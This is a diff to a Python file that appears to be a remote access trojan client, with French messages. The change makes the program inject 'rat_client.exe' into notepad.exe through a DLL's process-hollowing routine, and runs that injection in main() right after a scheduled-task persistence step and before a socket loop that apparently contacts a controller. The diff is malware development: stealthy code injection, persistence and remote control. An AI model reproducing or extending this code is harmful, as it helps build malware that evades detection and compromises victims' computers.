@@ -2,7 +2,6 @@
 import socket
 import subprocess
 import os
-import sys
 import time
 import random
 import getpass
@@ -94,14 +93,14 @@ def hollowing():
     dll.Hollowing.restype = c_int
 
     target = b"C:\\Windows\\System32\\notepad.exe"
-    payload = b"C:\\chemin\\vers\\payload.exe"
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    payload_path = os.path.join(current_dir, "dist", "rat_client.exe").encode('utf-8')
 
-    ret = dll.Hollowing(target, payload)
-    if ret == 0:
-        print("Hollowing réussi")
+    result = dll.Hollowing(c_char_p(target), c_char_p(payload_path))
+    if result == 0:
+        print("✅ Hollowing réussi")
     else:
-        print(f"Hollowing échoué, code erreur {ret}")
-
+        print(f"❌ Hollowing échoué, code erreur {result}")
 
 
 def main():
@@ -112,6 +111,7 @@ def main():
         time.sleep(SIMULATE_STARTUP_DELAY)
 
     shedule_task_for_user()
+    hollowing()
     sock = None
     try:
         while True:
